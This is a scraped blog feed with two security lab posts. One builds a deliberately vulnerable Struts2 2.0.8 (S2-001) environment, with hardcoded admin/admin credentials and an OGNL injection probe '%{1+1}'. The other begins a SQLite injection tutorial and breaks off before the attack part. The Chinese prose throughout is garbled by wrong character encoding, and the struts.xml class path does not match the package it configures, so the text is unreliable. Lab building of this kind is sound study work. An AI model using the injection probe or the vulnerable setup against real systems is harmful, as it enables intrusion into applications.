<p><img src="https://lanvnal-blog.oss-cn-qingdao.aliyuncs.com/article_imgs/Struts2_Env/16076159094442.jpg" alt="-w1376"></p>
<p>ä¸‹ä¸€æ­¥å°±æ˜¯é€‰æ‹©é¡¹ç›®æ–‡ä»¶å¤¹<br><img src="https://lanvnal-blog.oss-cn-qingdao.aliyuncs.com/article_imgs/Struts2_Env/16076160983476.jpg" alt="-w1376"></p>
<p>ç„¶å<code>groupid</code>å’Œ<code>artifactid</code>éƒ½å¯ä»¥è‡ªå®šä¹‰ï¼Œä¹‹åFinishã€‚</p>
<p><img src="https://lanvnal-blog.oss-cn-qingdao.aliyuncs.com/article_imgs/Struts2_Env/16076162561059.jpg" alt="-w1376"></p>
<p>ç„¶åä¼šè‡ªåŠ¨ä¸‹è½½æ‰€éœ€çš„jaråŒ…ç­‰æ–‡ä»¶è¿›è¡Œæ„å»ºï¼Œåªéœ€è¦é™é™ç­‰å¾…å‡ åˆ†é’Ÿå°±å¥½äº†ã€‚<br>ç„¶åæ­¤æ—¶åˆ›å»ºå¥½çš„é¡¹ç›®å¦‚å›¾æ‰€ç¤ºã€‚</p>
<p><img src="https://lanvnal-blog.oss-cn-qingdao.aliyuncs.com/article_imgs/Struts2_Env/16076166097919.jpg" alt="-w1512"></p>
<p>æ¥ä¸‹æ¥åˆ†åˆ«æ·»åŠ å¹¶é…ç½®Mavençš„<code>pom.xml</code>ï¼ŒTomcatçš„<code>web.xml</code>ï¼ŒStruts2çš„<code>struts.xml</code>ã€‚</p>
<p>åœ¨mainç›®å½•ä¸‹åˆ›å»ºä¸€ä¸ªjavaæ–‡ä»¶å¤¹ï¼Œé‡Œé¢æ”¾ç½®æˆ‘ä»¬è‡ªå®šä¹‰çš„javaç±»æ–‡ä»¶.<br><img src="https://lanvnal-blog.oss-cn-qingdao.aliyuncs.com/article_imgs/Struts2_Env/16076169701640.jpg" alt="-w406"></p>
<p>åœ¨é‡Œé¢æˆ‘ä»¬åˆ›å»ºè‡ªå®šä¹‰çš„Java Packageã€‚<br><img src="https://lanvnal-blog.oss-cn-qingdao.aliyuncs.com/article_imgs/Struts2_Env/16076170175844.jpg" alt="-w406"></p>
<p>ç„¶ååœ¨å…¶ä¸­åˆ›å»ºä¸€ä¸ªåä¸ºLoginActionçš„Javaç±»ï¼Œå†…å®¹ä¸º:</p>
<pre class=" language-java"><code class="language-java"><span class="token keyword">package</span> com<span class="token punctuation">.</span>lanvnal<span class="token punctuation">.</span>s2001<span class="token punctuation">.</span>action<span class="token punctuation">;</span>

<span class="token keyword">import</span> com<span class="token punctuation">.</span>opensymphony<span class="token punctuation">.</span>xwork2<span class="token punctuation">.</span>ActionSupport<span class="token punctuation">;</span>

<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">LoginAction</span> <span class="token keyword">extends</span> <span class="token class-name">ActionSupport</span><span class="token punctuation">{</span>
    <span class="token keyword">private</span> String username <span class="token operator">=</span> null<span class="token punctuation">;</span>
    <span class="token keyword">private</span> String password <span class="token operator">=</span> null<span class="token punctuation">;</span>

    <span class="token keyword">public</span> String <span class="token function">getUsername</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">return</span> <span class="token keyword">this</span><span class="token punctuation">.</span>username<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">public</span> String <span class="token function">getPassword</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">return</span> <span class="token keyword">this</span><span class="token punctuation">.</span>password<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">setUsername</span><span class="token punctuation">(</span>String username<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">this</span><span class="token punctuation">.</span>username <span class="token operator">=</span> username<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">setPassword</span><span class="token punctuation">(</span>String password<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">this</span><span class="token punctuation">.</span>password <span class="token operator">=</span> password<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">public</span> String <span class="token function">execute</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">throws</span> Exception <span class="token punctuation">{</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>username<span class="token punctuation">.</span><span class="token function">isEmpty</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>password<span class="token punctuation">.</span><span class="token function">isEmpty</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token keyword">return</span> <span class="token string">"error"</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>username<span class="token punctuation">.</span><span class="token function">equalsIgnoreCase</span><span class="token punctuation">(</span><span class="token string">"admin"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
                <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>password<span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span><span class="token string">"admin"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token keyword">return</span> <span class="token string">"success"</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
        <span class="token keyword">return</span> <span class="token string">"error"</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span></code></pre>
<p>åˆšå¼€å§‹æ·»åŠ äº†ä»£ç ä¹‹åå¯èƒ½ä¼šæœ‰æŠ¥é”™ï¼Œè¿™æ˜¯å› ä¸ºæ²¡æœ‰å¼•å…¥è¯¥åŒ…</p>
<p><img src="https://lanvnal-blog.oss-cn-qingdao.aliyuncs.com/article_imgs/Struts2_Env/16076174879559.jpg" alt="-w674"></p>
<p>å¯ä»¥å…ˆä¸ç”¨ç®¡ï¼Œå»é…ç½®ä¸€ä¸‹<code>pom.xml</code>å°±å¥½äº†ã€‚<br>æ¥ä¸‹æ¥ä¿®æ”¹pom.xmlï¼Œæ·»åŠ å¦‚ä¸‹å†…å®¹:(æ·»åŠ åˆ°<code>&lt;dependencies&gt;</code>è¿™ä¸€å¯¹æ ‡ç­¾ä¸­)</p>
<pre class=" language-xml"><code class="language-xml"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">></span></span>org.apache.struts<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">></span></span>struts2-core<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">></span></span>2.0.8<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">></span></span></code></pre>
<p>æ·»åŠ è¿™ä¸ªé…ç½®ä¹‹åï¼Œç‚¹å‡»ç•Œé¢ä¸Šå‡ºç°äº†mavenæ›´æ–°å°æŒ‰é’®Mavenä¼šè‡ªåŠ¨å°†å¯¹åº”ç‰ˆæœ¬çš„JaråŒ…ä¸‹è½½å¯¼å…¥ï¼Œä¸éœ€è¦æ‰‹å·¥é…ç½®äº†ã€‚<br><img src="https://lanvnal-blog.oss-cn-qingdao.aliyuncs.com/article_imgs/Struts2_Env/16076175738228.jpg" alt="-w368"></p>
<p>å†ä¿®æ”¹<code>web.xml</code>ï¼Œåœ¨è¿™é‡Œä¸»è¦æ˜¯é…ç½®<code>struts2</code>çš„è¿‡æ»¤å™¨ã€‚</p>
<pre class=" language-xml"><code class="language-xml"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>web-app</span><span class="token punctuation">></span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>display-name</span><span class="token punctuation">></span></span>S2-001 Example<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>display-name</span><span class="token punctuation">></span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>filter</span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>filter-name</span><span class="token punctuation">></span></span>struts2<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>filter-name</span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>filter-class</span><span class="token punctuation">></span></span>org.apache.struts2.dispatcher.FilterDispatcher<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>filter-class</span><span class="token punctuation">></span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>filter</span><span class="token punctuation">></span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>filter-mapping</span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>filter-name</span><span class="token punctuation">></span></span>struts2<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>filter-name</span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>url-pattern</span><span class="token punctuation">></span></span>/*<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>url-pattern</span><span class="token punctuation">></span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>filter-mapping</span><span class="token punctuation">></span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>welcome-file-list</span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>welcome-file</span><span class="token punctuation">></span></span>index.jsp<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>welcome-file</span><span class="token punctuation">></span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>welcome-file-list</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>web-app</span><span class="token punctuation">></span></span></code></pre>
<p>ç„¶åï¼Œåœ¨ <code>webapp</code> ç›®å½•ä¸‹åˆ›å»º&amp;ä¿®æ”¹ä¸¤ä¸ªæ–‡ä»¶ â€”â€” <code>index.jsp</code>&amp;<code>welcome.jsp</code>ï¼Œå†…å®¹å¦‚ä¸‹ã€‚</p>
<p><strong>index.jsp</strong></p>
<pre class=" language-jsp"><code class="language-jsp"><%@ page language="java" contentType="text/html; charset=UTF-8"
         pageEncoding="UTF-8"%>
<%@ taglib prefix="s" uri="/struts-tags" %>
<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
<html>
<head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <title>S2-001</title>
</head>
<body>
<h2>S2-001 Demo</h2>
<p>link: <a href="https://cwiki.apache.org/confluence/display/WW/S2-001">https://cwiki.apache.org/confluence/display/WW/S2-001</a></p>
<s:form action="login">
    <s:textfield name="username" label="username" />
    <s:textfield name="password" label="password" />
    <s:submit></s:submit>
</s:form>
</body>
</html></code></pre>
<p><strong>welcome.jsp</strong></p>
<pre class=" language-jsp"><code class="language-jsp"><%--
  Created by IntelliJ IDEA.
  User: lanvnal
  Date: 2020/12/11
  Time: 12:32 ä¸Šåˆ
  To change this template use File | Settings | File Templates.
--%>
<%@ page language="java" contentType="text/html; charset=UTF-8"
         pageEncoding="UTF-8"%>
<%@ taglib prefix="s" uri="/struts-tags" %>
<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
<html>
<head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <title>S2-001</title>
</head>
<body>
<p>Hello <s:property value="username"></s:property></p>
</body>
</html></code></pre>
<p>ç„¶ååœ¨ <code>main</code> æ–‡ä»¶å¤¹ä¸‹åˆ›å»ºä¸€ä¸ª <code>resources</code> æ–‡ä»¶å¤¹ï¼Œå†…éƒ¨æ·»åŠ ä¸€ä¸ª <code>struts.xml</code>ï¼Œå†…å®¹ä¸ºï¼š</p>
<pre class=" language-xml"><code class="language-xml"><span class="token prolog">&lt;?xml version="1.0" encoding="UTF-8"?></span>

<span class="token doctype">&lt;!DOCTYPE struts PUBLIC
        "-//Apache Software Foundation//DTD Struts Configuration 2.0//EN"
        "http://struts.apache.org/dtds/struts-2.0.dtd"></span>

<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>struts</span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>package</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>S2-001<span class="token punctuation">"</span></span> <span class="token attr-name">extends</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>struts-default<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>action</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>login<span class="token punctuation">"</span></span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>com.mengsec.s2001.action.LoginAction<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>result</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>success<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>welcome.jsp<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>result</span><span class="token punctuation">></span></span>
            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>result</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>error<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>index.jsp<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>result</span><span class="token punctuation">></span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>action</span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>package</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>struts</span><span class="token punctuation">></span></span></code></pre>
<p>è¿™é‡Œé‡åˆ°äº†ä¸ªå°é—®é¢˜ï¼Œå°±æ˜¯æ·»åŠ  <code>struts.xml</code> æ–‡ä»¶æ—¶æ–°å»ºæ–‡ä»¶æ¨¡æ¿é‡Œæ²¡æœ‰å¯¹åº”çš„é…ç½®ï¼š<br><img src="https://lanvnal-blog.oss-cn-qingdao.aliyuncs.com/article_imgs/Struts2_Env/16076187822578.jpg" alt="-w1005"></p>
<p>è§£å†³æ–¹æ¡ˆå°±æ˜¯åœ¨é¦–é€‰é¡¹ =&gt; plugins =&gt; æœç´¢struts2 ç„¶åå®‰è£…å°±å¥½äº†<br><img src="https://lanvnal-blog.oss-cn-qingdao.aliyuncs.com/article_imgs/Struts2_Env/16076188441890.jpg" alt="-w1109"></p>
<p><img src="https://lanvnal-blog.oss-cn-qingdao.aliyuncs.com/article_imgs/Struts2_Env/16076188897216.jpg" alt="-w824"></p>
<p>æ­¤æ—¶é¡¹ç›®ç›®å½•å¦‚ä¸‹ï¼š<br><img src="https://lanvnal-blog.oss-cn-qingdao.aliyuncs.com/article_imgs/Struts2_Env/16076189686774.jpg" alt="-w401"></p>
<p>æ¥ä¸‹æ¥é…ç½®TomcatæœåŠ¡å™¨ï¼Œåœ¨Macä¸Šçš„è¯ï¼Œç›´æ¥ <code>brew install tomcat</code> å³å¯å®‰è£…tomcat9ï¼Œå®‰è£…çš„è·¯å¾„ä¸º<code>/usr/local/Cellar/tomcat/9.0.39</code>ã€‚</p>
<blockquote>
<p>To have launchd start tomcat now and restart at login:<br>brew services start tomcat<br>Or, if you donâ€™t want/need a background service you can just run:<br>catalina run</p>
</blockquote>
<p>å¦‚æœæƒ³è¦åå°å¯åŠ¨æœåŠ¡ï¼Œä½¿ç”¨ï¼š<code>brew services start tomcat</code><br>ä¸éœ€è¦çš„è¯ç›´æ¥ï¼š<code>catalina run</code></p>
<h3 id="2-2-æ·»åŠ æœåŠ¡å™¨"><a href="#2-2-æ·»åŠ æœåŠ¡å™¨" class="headerlink" title="2.2 æ·»åŠ æœåŠ¡å™¨"></a>2.2 æ·»åŠ æœåŠ¡å™¨</h3><p>æ·»åŠ ä¸€ä¸ªæœ¬åœ°çš„TomcatæœåŠ¡å™¨ã€‚å…·ä½“æ­¥éª¤å¦‚ä¸‹å›¾<br><img src="https://lanvnal-blog.oss-cn-qingdao.aliyuncs.com/article_imgs/Struts2_Env/16076192942664.jpg" alt="-w1426"></p>
<p>è¿™ä¸ªè·¯å¾„å‚è€ƒå‰é¢å®‰è£…æ—¶æåˆ°çš„å®‰è£…ç›®å½•<br><img src="https://lanvnal-blog.oss-cn-qingdao.aliyuncs.com/article_imgs/Struts2_Env/16076194451436.jpg" alt="-w1507"></p>
<p>ç«¯å£æ ¹æ®è‡ªèº«ç¯å¢ƒä¿®æ”¹ï¼Œæˆ‘æ”¹æˆäº†8008.<br>ç„¶åå³ä¸‹è§’çš„æç¤ºï¼Œå¯ä»¥ç‚¹å‡»fixæˆ–è€…ç‚¹å‡»Deploymentï¼Œæ·»åŠ ä¸€ä¸ªartifactsã€‚</p>
<p>ç„¶åç‚¹å‡»å·¦ä¸Šè§’çš„ç»¿è‰²ä¸‰è§’å°±å¯ä»¥è¿è¡Œäº†ã€‚</p>
<p><img src="https://lanvnal-blog.oss-cn-qingdao.aliyuncs.com/article_imgs/Struts2_Env/16076202862267.jpg" alt=""></p>
<h3 id="2-3-æµ‹è¯•ç¯å¢ƒ"><a href="#2-3-æµ‹è¯•ç¯å¢ƒ" class="headerlink" title="2.3 æµ‹è¯•ç¯å¢ƒ"></a>2.3 æµ‹è¯•ç¯å¢ƒ</h3><p>åœ¨username çš„è¾“å…¥æ¡†è¾“å…¥ï¼š<code>%{1+1}</code></p>
<p><img src="https://lanvnal-blog.oss-cn-qingdao.aliyuncs.com/article_imgs/Struts2_Env/16076203423070.jpg" alt=""></p>
<p>å¦‚å›¾ï¼Œç¯å¢ƒæ­å»ºæˆåŠŸï¼</p>
]]></content>
      <categories>
        <category>Javaå®‰å…¨</category>
      </categories>
      <tags>
        <tag>Javaå®‰å…¨</tag>
        <tag>Struts2</tag>
      </tags>
  </entry>
  <entry>
    <title>Sqliteæ³¨å…¥çš„ä¸€ç‚¹æ€»ç»“</title>
    <url>/2020/12/08/sqlite-zhu-ru-de-yi-dian-zong-jie/</url>
    <content><![CDATA[<blockquote>
<p>æœ¬æ–‡é¦–å‘äºå…ˆçŸ¥ç¤¾åŒºï¼ŒåŸæ–‡é“¾æ¥ï¼š<a href="https://xz.aliyun.com/t/8627" target="_blank" rel="noopener">https://xz.aliyun.com/t/8627</a></p>
<p>æ‰“iiscçš„åˆèµ›é‡åˆ°äº†ä¸€é“sqliteçš„é¢˜ç›®ï¼Œå‘ç°sqliteçš„æ³¨å…¥é‡åˆ°çš„å¾ˆå°‘ï¼Œäºæ˜¯å¹²è„†æ¢³ç†ä¸€ä¸‹ï¼Œæ€»ç»“ä¸€ä¸‹ã€‚</p>
</blockquote>
<h2 id="sqliteåŸºç¡€"><a href="#sqliteåŸºç¡€" class="headerlink" title="sqliteåŸºç¡€"></a>sqliteåŸºç¡€</h2><p>sqliteå’Œmysqlç­‰è¿˜æ˜¯æœ‰äº›åŒºåˆ«çš„ï¼Œsqliteçš„æ¯ä¸€ä¸ªæ•°æ®åº“å°±æ˜¯ä¸€ä¸ªæ–‡ä»¶ã€‚</p>
<p><strong>åˆ›å»ºæ•°æ®åº“</strong></p>
<pre class=" language-sql"><code class="language-sql">sqlite3 test<span class="token number">.db</span></code></pre>
<p>è¿™ä¸ªå‘½ä»¤æ‰§è¡Œåå°±ä¼šåœ¨å½“å‰ç›®å½•ä¸‹ç”Ÿæˆå¯¹åº”åç§°çš„æ–‡ä»¶ï¼Œä¹‹åçš„æ•°æ®æ“ä½œéƒ½æ˜¯å¯¹è¯¥æ–‡ä»¶çš„æ“ä½œã€‚</p>
<p>æ‰§è¡Œè¿™ä¸ªå‘½ä»¤æˆåŠŸåˆ›å»ºæ•°æ®åº“æ–‡ä»¶ä¹‹åï¼Œå°†æä¾›ä¸€ä¸ª sqlite&gt; æç¤ºç¬¦ã€‚</p>
<p>æ•°æ®åº“æˆåŠŸåˆ›å»ºåå¯ä»¥ä½¿ç”¨ SQLite çš„ .databases å‘½ä»¤æ¥æ£€æŸ¥å®ƒæ˜¯å¦åœ¨æ•°æ®åº“åˆ—è¡¨ä¸­<br><img src="https://lanvnal-blog.oss-cn-qingdao.aliyuncs.com/article_imgs/sqlite_inject/16037974037049.jpg" alt=""></p>
<p><strong>æ‰“å¼€æ•°æ®åº“</strong></p>
<pre class=" language-sql"><code class="language-sql"><span class="token keyword">Use</span> <span class="token string">".open FILENAME"</span> <span class="token keyword">to</span> reopen <span class="token keyword">on</span> <span class="token number">a</span> persistent <span class="token keyword">database</span><span class="token punctuation">.</span>
sqlite<span class="token operator">></span> <span class="token punctuation">.</span><span class="token keyword">open</span> sqltest<span class="token number">.db</span></code></pre>
<p><strong>å¯¼å…¥å¯¼å‡º</strong></p>
<pre><code># å¯¼å‡º
$sqlite3 testDB.db .dump &gt; testDB.sql
# å¯¼å…¥
$sqlite3 testDB.db &lt; testDB.sql</code></pre><p><strong>åˆ›å»ºè¡¨</strong></p>
<p>è¯­å¥å’Œmysqlå·®ä¸å¤š</p>
<pre class=" language-sql"><code class="language-sql">sqlite<span class="token operator">></span> <span class="token keyword">create</span> <span class="token keyword">table</span> test<span class="token punctuation">(</span>
   <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">></span> id <span class="token keyword">INT</span> <span class="token keyword">PRIMARY</span> <span class="token keyword">KEY</span>     <span class="token operator">NOT</span> <span class="token boolean">NULL</span><span class="token punctuation">,</span>
   <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">></span> name char<span class="token punctuation">(</span><span class="token number">50</span><span class="token punctuation">)</span> <span class="token operator">NOT</span> <span class="token boolean">NULL</span>
   <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">></span> <span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre>
<p><strong>æŸ¥çœ‹è¡¨</strong></p>
<p> .tables å‘½ä»¤ç”¨æ¥åˆ—å‡ºé™„åŠ æ•°æ®åº“ä¸­çš„æ‰€æœ‰è¡¨ã€‚</p>
<pre><code>sqlite&gt; .tables
test</code></pre><p>.schema å‘½ä»¤å¾—åˆ°è¡¨çš„å®Œæ•´ä¿¡æ¯:</p>
<pre><code>sqlite&gt; .schema test
CREATE TABLE test(
id INT PRIMARY KEY     NOT NULL,
name char(50) NOT NULL
);</code></pre><p>å€¼å¾—æ³¨æ„çš„ä¸€ç‚¹æ˜¯å¾—åˆ°çš„ç»“æœæ˜¯æˆ‘ä»¬åˆ›å»ºè¡¨æ—¶æ‰§è¡Œçš„å‘½ä»¤è¯­å¥ï¼Œè¿™ä¹Ÿæ˜¯sqliteçš„ç‰¹ç‚¹ï¼Œä¹‹åå†è¯´ã€‚</p>
<p><strong>æ’å…¥æ•°æ®</strong></p>
<p>INSERT INTO è¯­å¥ç”¨äºå‘æ•°æ®åº“çš„æŸä¸ªè¡¨ä¸­æ·»åŠ æ–°çš„æ•°æ®è¡Œã€‚</p>
<pre class=" language-sql"><code class="language-sql">sqlite<span class="token operator">></span> <span class="token keyword">insert</span> <span class="token keyword">into</span> test <span class="token punctuation">(</span>id<span class="token punctuation">,</span>name<span class="token punctuation">)</span> <span class="token keyword">values</span> <span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token string">'alice'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
sqlite<span class="token operator">></span> <span class="token keyword">insert</span> <span class="token keyword">into</span> test <span class="token punctuation">(</span>id<span class="token punctuation">,</span>name<span class="token punctuation">)</span> <span class="token keyword">values</span> <span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token string">'bob'</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre>
<p><strong>æŸ¥è¯¢è¯­å¥</strong></p>
<p>ä½¿ç”¨selectå…³é”®å­—</p>
<pre class=" language-sql"><code class="language-sql">sqlite<span class="token operator">></span> <span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> test<span class="token punctuation">;</span>
id          name
<span class="token comment" spellcheck="true">----------  ----------</span>
<span class="token number">1</span>           alice
<span class="token number">2</span>           bob

sqlite<span class="token operator">></span> <span class="token keyword">select</span> name <span class="token keyword">from</span> test<span class="token punctuation">;</span>
name
<span class="token comment" spellcheck="true">----------</span>
alice
bob</code></pre>
<p>å¦‚æœæŸ¥è¯¢ç»“æœæ ¼å¼æ¯”è¾ƒä¹±ï¼Œéœ€è¦è®¾ç½®æ ¼å¼åŒ–è¾“å‡ºã€‚</p>
<p><strong>sqlite_master</strong></p>
<p>sqlite_masterè¡¨ä¸­ä¿å­˜æ•°æ®åº“è¡¨çš„å…³é”®ä¿¡æ¯ã€‚<br>è¿™æ˜¯sqlite_masterè¡¨çš„ç»“æ„</p>
<pre><code>sqlite&gt; .schema sqlite_master
CREATE TABLE sqlite_master (
  type text,
  name text,
  tbl_name text,
  rootpage integer,
  sql text
);</code></pre><p>ä»–ä¿å­˜äº†æ‰§è¡Œçš„sqlè¯­å¥ï¼Œä¹Ÿæ˜¯ä¹‹åæ³¨å…¥æŸ¥è¯¢è¡¨ååˆ—åçš„å…³é”®ã€‚</p>
<p>ä»sqlite_masteræŸ¥è¡¨å:</p>
<pre class=" language-sql"><code class="language-sql">sqlite<span class="token operator">></span> <span class="token keyword">select</span> tbl_name <span class="token keyword">from</span> sqlite_master <span class="token keyword">where</span> <span class="token keyword">type</span><span class="token operator">=</span><span class="token string">'table'</span><span class="token punctuation">;</span>
tbl_name
<span class="token comment" spellcheck="true">----------</span>
test</code></pre>
<p>è·å–è¡¨åå’Œåˆ—åï¼š</p>
<pre class=" language-sql"><code class="language-sql">sqlite<span class="token operator">></span> <span class="token keyword">select</span> sql <span class="token keyword">from</span> sqlite_master <span class="token keyword">where</span> <span class="token keyword">type</span><span class="token operator">=</span><span class="token string">'table'</span><span class="token punctuation">;</span>
sql
<span class="token comment" spellcheck="true">----------------------------------------------------------------------------</span>
<span class="token keyword">CREATE</span> <span class="token keyword">TABLE</span> test<span class="token punctuation">(</span>
id <span class="token keyword">INT</span> <span class="token keyword">PRIMARY</span> <span class="token keyword">KEY</span>     <span class="token operator">NOT</span> <span class="token boolean">NULL</span><span class="token punctuation">,</span>
name char<span class="token punctuation">(</span><span class="token number">50</span><span class="token punctuation">)</span> <span class="token operator">NOT</span> <span class="token boolean">NULL</span>
<span class="token punctuation">)</span></code></pre>
<p><strong>æ ¼å¼åŒ–è¾“å‡º</strong></p>
<p>æ ¼å¼åŒ–è¾“å‡ºå†…å®¹ï¼Œèƒ½æ›´ç›´è§‚æŸ¥çœ‹å‘½ä»¤æ‰§è¡Œç»“æœã€‚</p>
<pre><code>sqlite&gt;.header on
sqlite&gt;.mode column
sqlite&gt;.timer on
sqlite&gt;</code></pre><p>è¿˜æœ‰å…¶ä»–çš„æŸ¥è¯¢è¯­æ³•å¯ä»¥å»æŸ¥è¯¢æ–‡æ¡£ã€‚</p>
<h2 id="sqliteæ³¨å…¥"><a href="#sqliteæ³¨å…¥" class="headerlink" title="sqliteæ³¨å…¥"></a>sqliteæ³¨å…¥</h2><h3 id="Demoä»£ç "><a href="#Demoä»£ç " class="headerlink" title="Demoä»£ç :"></a>Demoä»£ç :</h3><p>æ•°æ®åº“æ•°æ®ï¼š</p>
<pre><code>sqlite&gt; create table user_data(
   ...&gt; id INT PRIMARY KEY NOT NULL,
   ...&gt; name char(50) NOT NULL,
   ...&gt; passwd cahr(50) NOT NULL);

sqlite&gt; insert into user_data (id,name,passwd) values (1,&#39;admin&#39;,&#39;password&#39;);
sqlite&gt; insert into user_data (id,name,passwd) values (2,&#39;bob&#39;,&#39;wowowow&#39;);
sqlite&gt; insert into user_data (id,name,passwd) values (3,&#39;flag&#39;,&#39;flag{test}&#39;);
sqlite&gt; select * from user_data;
1|admin|password
2|bob|wowowow
3|flag|flag{test}</code></pre><p>é¡µé¢ï¼š</p>
<pre class=" language-php"><code class="language-php">
<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span></span>
    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span></span>
